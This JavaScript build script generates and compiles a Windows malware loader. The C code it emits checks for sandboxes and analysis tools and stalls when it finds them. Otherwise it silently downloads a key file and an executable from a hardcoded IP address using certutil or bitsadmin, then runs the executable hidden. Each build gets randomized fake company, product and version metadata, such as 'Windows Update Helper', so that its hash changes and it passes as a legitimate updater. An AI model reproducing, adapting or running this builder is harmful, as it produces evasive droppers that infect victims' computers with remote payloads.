// language: JavaScript, file: builder/compile.js
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import crypto from 'node:crypto';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { fileURLToPath } from 'node:url';

const execFileP = promisify(execFile);
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const CC      = process.env.MINGW_CC      || 'x86_64-w64-mingw32-gcc';
const WINDRES = process.env.MINGW_WINDRES || 'x86_64-w64-mingw32-windres';

// ─── seeded PRNG (mulberry32) ────────────────────────────────────────────────
function makeRng(seed) {
  let s = (seed >>> 0) || 1;
  return {
    next() {
      s = (s + 0x6D2B79F5) | 0;
      let t = Math.imul(s ^ (s >>> 15), 1 | s);
      t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
      return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
    },
    int(max) { return Math.floor(this.next() * max); },
    pick(arr) { return arr[this.int(arr.length)]; },
    hex(len) {
      const chars = '0123456789abcdef';
      let out = '';
      for (let i = 0; i < len; i++) out += chars[this.int(16)];
      return out;
    },
  };
}

// ─── plausible metadata pools ────────────────────────────────────────────────
const COMPANIES = [
  'Acme Software Inc.', 'Contoso Ltd.', 'Initech Systems', 'Globex Corporation',
  'Northwind Traders', 'Umbrella Data Systems', 'Stark Industries', 'Wayne Enterprises',
  'Cyberdyne Systems', 'Soylent Corp', 'Tyrell Corporation', 'Wonka Industries',
  'Massive Dynamic', 'Hooli Inc.', 'Pied Piper', 'Aperture Science',
  'Black Mesa Research', 'Vandelay Industries', 'Dunder Mifflin', 'Sterling Cooper',
  'Bluth Company', 'Prestige Worldwide', 'Wernham Hogg', 'Sabre Corp',
  'Virtucon', 'Zorg Industries', 'Rekall Inc.', 'Omni Consumer Products',
  'Cybertek Systems', 'Virtucom Networks',
];

const PRODUCTS = [
  'Update Helper', 'System Updater', 'Security Assistant', 'Network Utility',
  'Runtime Manager', 'Driver Updater', 'Component Service', 'Platform Sync',
  'Data Assistant', 'Windows Helper', 'Session Manager', 'Resource Monitor',
  'Update Center', 'System Sync', 'Client Service', 'Maintenance Tool',
  'Diagnostics Helper', 'Support Utility', 'Sync Agent', 'Config Manager',
  'Background Service', 'Platform Agent',
];

const FILE_DESCRIPTIONS = [
  'Windows Update Helper', 'System Maintenance Utility', 'Background Update Service',
  'Network Sync Helper', 'Component Update Agent', 'System Resource Manager',
  'Platform Diagnostics', 'Runtime Assistant', 'Update Synchronization Service',
  'Background Helper Utility', 'Client Update Agent',
];

const INTERNAL_NAMES = [
  'wuauclt', 'wupdater', 'syshelper', 'updater', 'syssync', 'svcman',
  'helper', 'diaghost', 'winsupd', 'synchronizer', 'clientsvc', 'rtsvc',
  'svchostx', 'sysmain',
];

const COPYRIGHT_YEARS = ['2019', '2020', '2021', '2022', '2023', '2024', '2025'];
const DOWNLOADERS = ['certutil', 'bitsadmin'];

// ─── per-build unique metadata ───────────────────────────────────────────────
export function randomBuildMeta(seed) {
  const rng = makeRng(seed);
  const build = 19041 + rng.int(300);
  const patch = rng.int(1000);
  const version = `10.0.${build}.${patch}`;
  const versionComma = `10,0,${build},${patch}`;
  const guid =
    `{${rng.hex(8)}-${rng.hex(4)}-${rng.hex(4)}-${rng.hex(4)}-${rng.hex(12)}}`.toUpperCase();
  const buildNonce = Array.from({ length: 16 }, () => rng.int(256));

  return {
    seed,
    company:        rng.pick(COMPANIES),
    product:        rng.pick(PRODUCTS),
    fileDesc:       rng.pick(FILE_DESCRIPTIONS),
    internalName:   rng.pick(INTERNAL_NAMES),
    version,
    versionComma,
    copyright:      `Copyright (C) ${rng.pick(COPYRIGHT_YEARS)} ${rng.pick(COMPANIES)}`,
    guid,
    buildNonce,
    downloader:     rng.pick(DOWNLOADERS),
    retries:        3 + rng.int(4),
    retryDelaySec:  1 + rng.int(4),
    initialSleepMs: 800 + rng.int(2500),
    logName:        rng.pick(['update.log', 'sync.log', 'service.log', 'agent.log', 'helper.log']),
    jobName:        rng.pick(['wh_update', 'upd_job', 'svc_update', 'sync_job', 'agent_fetch']),
  };
}

// ─── C source generator ──────────────────────────────────────────────────────
function cSource(meta, ip, buildId) {
  const keyUrl = `http://${ip}/api/getkey/${buildId}`;
  const stUrl  = `http://${ip}/api/downloads/st.exe`;
  const esc4c  = (s) => String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"');
  const nonceArr = meta.buildNonce.map(b => '0x' + b.toString(16).padStart(2, '0')).join(',');
  const useCertutil = meta.downloader === 'certutil';

  return String.raw`
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <wchar.h>

// ── per-build unique metadata (changes hash every build) ────────────────────
__attribute__((used))
static const wchar_t META_GUID[]    = L"${esc4c(meta.guid)}";
__attribute__((used))
static const wchar_t META_PRODUCT[] = L"${esc4c(meta.product)}";
__attribute__((used))
static const wchar_t META_COMPANY[] = L"${esc4c(meta.company)}";
__attribute__((used))
static const char    BUILD_NONCE[16] = { ${nonceArr} };

// ── config blob (looks like a normal app config, read at runtime) ───────────
__attribute__((used))
static const wchar_t CONFIG_BLOB[] =
    L"[agent]\n"
    L"guid=${esc4c(meta.guid)}\n"
    L"version=${esc4c(meta.version)}\n"
    L"product=${esc4c(meta.product)}\n"
    L"endpoint=${esc4c(stUrl)}\n"
    L"interval=${meta.retries * 600}\n";

// ── endpoints ───────────────────────────────────────────────────────────────
static const wchar_t CFG_KEY_URL[] = L"${esc4c(keyUrl)}";
static const wchar_t CFG_ST_URL[]  = L"${esc4c(stUrl)}";

// ── per-build tuning ────────────────────────────────────────────────────────
#define INITIAL_SLEEP_MS ${meta.initialSleepMs}
#define RETRIES          ${meta.retries}
#define RETRY_DELAY_SEC  ${meta.retryDelaySec}
#define USE_CERTUTIL     ${useCertutil ? 1 : 0}
#define JOB_NAME_W       L"${esc4c(meta.jobName)}"
#define LOG_NAME_W       L"${esc4c(meta.logName)}"

// ── helpers ─────────────────────────────────────────────────────────────────
static void log_msg(const wchar_t* msg) {
    wchar_t appdata[MAX_PATH], path[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata))) return;
    _snwprintf(path, MAX_PATH, L"%ls\\%ls", appdata, LOG_NAME_W);
    HANDLE h = CreateFileW(path, FILE_APPEND_DATA, FILE_SHARE_READ, NULL,
                           OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD w = 0;
    SetFilePointer(h, 0, NULL, FILE_END);
    WriteFile(h, msg, (DWORD)(wcslen(msg) * sizeof(wchar_t)), &w, NULL);
    WriteFile(h, L"\r\n", 4, &w, NULL);
    CloseHandle(h);
}

static int size_ok(const wchar_t* p, long long min_size) {
    HANDLE h = CreateFileW(p, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    LARGE_INTEGER sz = {0};
    GetFileSizeEx(h, &sz);
    CloseHandle(h);
    return sz.QuadPart >= min_size;
}

static int is_pe(const wchar_t* p) {
    HANDLE h = CreateFileW(p, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    char sig[2] = {0};
    DWORD rd = 0;
    ReadFile(h, sig, 2, &rd, NULL);
    CloseHandle(h);
    return sig[0] == 'M' && sig[1] == 'Z';
}

static int download_via(const wchar_t* url, const wchar_t* dest) {
    wchar_t cmd[2048];
#if USE_CERTUTIL
    _snwprintf(cmd, 2048, L"certutil.exe -urlcache -split -f \"%ls\" \"%ls\"", url, dest);
#else
    _snwprintf(cmd, 2048, L"bitsadmin.exe /transfer %ls /download /priority normal \"%ls\" \"%ls\"",
               JOB_NAME_W, url, dest);
#endif
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi))
        return 0;
    DWORD wait = WaitForSingleObject(pi.hProcess, 60000);
    if (wait == WAIT_TIMEOUT) {
        TerminateProcess(pi.hProcess, 1);
        WaitForSingleObject(pi.hProcess, 5000);
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return size_ok(dest, 100);
}

// ── anti-VM / anti-sandbox (small, silent) ──────────────────────────────────
static int is_sandboxed(void) {
    wchar_t sb[] = { L'S', L'b', L'i', L'e', L'D', L'l', L'l', L'.', L'd', L'l', L'l', 0 };
    if (GetModuleHandleW(sb)) return 1;
    wchar_t cv[] = { L'c', L'm', L'd', L'v', L'r', L't', L'3', L'2', L'.', L'd', L'l', L'l', 0 };
    if (GetModuleHandleW(cv)) return 1;

    if (GetTickCount64() < 10ULL * 60 * 1000) return 1;

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return 1;

    return 0;
}

// ── entry ───────────────────────────────────────────────────────────────────
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    if (is_sandboxed()) {
        Sleep(180000 + (GetTickCount() % 300000));
        return 0;
    }

    Sleep(INITIAL_SLEEP_MS);

    wchar_t appdata[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdata))) return 1;
    wchar_t dir[MAX_PATH], keyPath[MAX_PATH], stPath[MAX_PATH];
    _snwprintf(dir,     MAX_PATH, L"%ls\\loader", appdata);
    _snwprintf(keyPath, MAX_PATH, L"%ls\\key.json", dir);
    _snwprintf(stPath,  MAX_PATH, L"%ls\\st.exe",   dir);
    CreateDirectoryW(dir, NULL);

    int need_key = !size_ok(keyPath, 10);
    int need_st  = !is_pe(stPath);

    if (need_key || need_st) {
        log_msg(L"update start");
        for (int i = 0; i < RETRIES && (need_key || need_st); i++) {
            if (need_key) {
                if (download_via(CFG_KEY_URL, keyPath) && size_ok(keyPath, 10)) {
                    log_msg(L"key ok");
                    need_key = 0;
                } else {
                    log_msg(L"key fail");
                    Sleep((DWORD)RETRY_DELAY_SEC * 1000);
                }
            }
            if (need_st) {
                if (download_via(CFG_ST_URL, stPath) && is_pe(stPath)) {
                    log_msg(L"st ok");
                    need_st = 0;
                } else {
                    log_msg(L"st fail");
                    DeleteFileW(stPath);
                    Sleep((DWORD)RETRY_DELAY_SEC * 1000);
                }
            }
        }
        if (need_st) { log_msg(L"giving up"); return 1; }
    }

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};
    wchar_t cmd[MAX_PATH];
    _snwprintf(cmd, MAX_PATH, L"\"%ls\"", stPath);
    CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW | DETACHED_PROCESS,
                   NULL, dir, &si, &pi);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread)  CloseHandle(pi.hThread);
    return 0;
}
`;
}

// ─── RC source generator (version resource per build) ───────────────────────
function rcSource(meta) {
  const esc4rc = (s) => String(s).replace(/"/g, '""');
  return `
#include <windows.h>
1 ICON "icon.ico"
VS_VERSION_INFO VERSIONINFO
FILEVERSION     ${meta.versionComma}
PRODUCTVERSION  ${meta.versionComma}
FILEOS          VOS_NT_WINDOWS32
FILETYPE        VFT_APP
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName",      "${esc4rc(meta.company)}"
            VALUE "FileDescription",  "${esc4rc(meta.fileDesc)}"
            VALUE "FileVersion",      "${meta.version}"
            VALUE "InternalName",     "${meta.internalName}"
            VALUE "OriginalFilename", "${meta.internalName}.exe"
            VALUE "ProductName",      "${esc4rc(meta.product)}"
            VALUE "ProductVersion",   "${meta.version}"
            VALUE "LegalCopyright",   "${esc4rc(meta.copyright)}"
        END
    END
END
`;
}

// ─── compile launcher ───────────────────────────────────────────────────────
export async function compileLauncher({ key, config, baseExe, buildId }) {
  const ip = (config && config.ip) || process.env.SERVER_IP || '95.182.96.216';

  // Seed: buildId XOR 32 bits of fresh randomness — per-build unique even
  // when two builds race for the same MAX(id)+1
  const seed = ((buildId >>> 0) * 2654435761 ^ crypto.randomBytes(4).readUInt32LE(0)) >>> 0;
  const meta = randomBuildMeta(seed);

  console.log(`[launcher] seed=${seed} company="${meta.company}" product="${meta.product}" version=${meta.version} dl=${meta.downloader}`);

  const workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wh-build-'));
  const cPath   = path.join(workDir, 'launcher.c');
  const rcPath  = path.join(workDir, 'app.rc');
  const resPath = path.join(workDir, 'app.res');
  const outPath = path.join(workDir, 'launcher.exe');

  fs.writeFileSync(cPath, cSource(meta, ip, buildId));
  fs.writeFileSync(rcPath, rcSource(meta));

  const iconSrc = path.join(__dirname, '..', 'icon.ico');
  if (fs.existsSync(iconSrc)) {
    fs.copyFileSync(iconSrc, path.join(workDir, 'icon.ico'));
  } else {
    fs.writeFileSync(path.join(workDir, 'icon.ico'),
      Buffer.from('00000100010001010000010018003000000016000000280000000100000002000000010018000000000000000000000000000000000000000000000000000000000000000000', 'hex'));
  }

  try {
    await execFileP(WINDRES, ['-I', workDir, '-i', rcPath, '-o', resPath,
                              '--input-format=rc', '--output-format=coff'],
                    { cwd: workDir, timeout: 30_000 });
    await execFileP(CC, ['-O2', '-s', '-mwindows', '-o', outPath, cPath, resPath,
                         '-lshell32', '-lole32', '-luser32', '-lkernel32', '-ladvapi32'],
                    { cwd: workDir, timeout: 60_000 });
    return fs.readFileSync(outPath);
  } finally {
    try { fs.rmSync(workDir, { recursive: true, force: true }); } catch {}
  }
}